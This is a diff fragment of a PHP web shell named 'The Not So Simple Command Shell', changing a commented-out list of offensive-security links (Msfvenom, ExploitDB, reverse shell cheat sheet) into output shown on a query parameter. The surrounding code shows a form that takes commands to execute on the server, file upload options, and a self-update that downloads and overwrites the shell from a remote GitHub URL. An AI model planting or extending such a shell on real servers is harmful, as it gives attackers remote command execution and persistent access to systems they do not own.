@@ -14,10 +14,6 @@
         <h4 style="">The Not So Simple Command Shell</h4>
         <form action="" method="get">Command? <input type="text" name="cmd" autofocus/>
         <button type="submit">Execute</button></form>
-<!--        <p>Quick Links:</p>
-        <a href="https://stationx-public-download.s3.us-west-2.amazonaws.com/nmap_cheet_sheet_v7.pdf" target="_blank">Nmap Cheat Sheet</a>&nbsp;&nbsp;&nbsp;<a href="https://www.exploit-db.com/" target="_blank">ExploitDB</a>&nbsp;&nbsp;&nbsp;
-        <a href="https://github.com/frizb/MSF-Venom-Cheatsheet" target="_blank">Msfvenom Cheat Sheet</a>&nbsp;&nbsp;&nbsp;
-        <a href="https://cxsecurity.com/exploit/" target="_blank" target="_blank">CX Security Vulnerability Database</a>&nbsp;&nbsp;&nbsp;<a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank">Reverse Shell Cheat Sheet</a><br>-->
         <p>File Options</p>
         <form action="" method="get">
         <select name="upload">
@@ -115,6 +111,12 @@
         if (isset($_GET['update']) && $_GET['update'] == "true"){
             file_put_contents('nsscmdshell.php', file_get_contents('https://raw.githubusercontent.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/main/nsscmdshell.php'));
             }
+        if (isset($_GET['links'])) {
+           echo '<p>Quick Links:</p>
+        <a href="https://stationx-public-download.s3.us-west-2.amazonaws.com/nmap_cheet_sheet_v7.pdf" target="_blank">Nmap Cheat Sheet</a>&nbsp;&nbsp;&nbsp;<a href="https://www.exploit-db.com/" target="_blank">ExploitDB</a>&nbsp;&nbsp;&nbsp;
+        <a href="https://github.com/frizb/MSF-Venom-Cheatsheet" target="_blank">Msfvenom Cheat Sheet</a>&nbsp;&nbsp;&nbsp;
+        <a href="https://cxsecurity.com/exploit/" target="_blank" target="_blank">CX Security Vulnerability Database</a>&nbsp;&nbsp;&nbsp;<a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank">Reverse Shell Cheat Sheet</a><br>';
+        }
         ?>
     </body>
 </html>
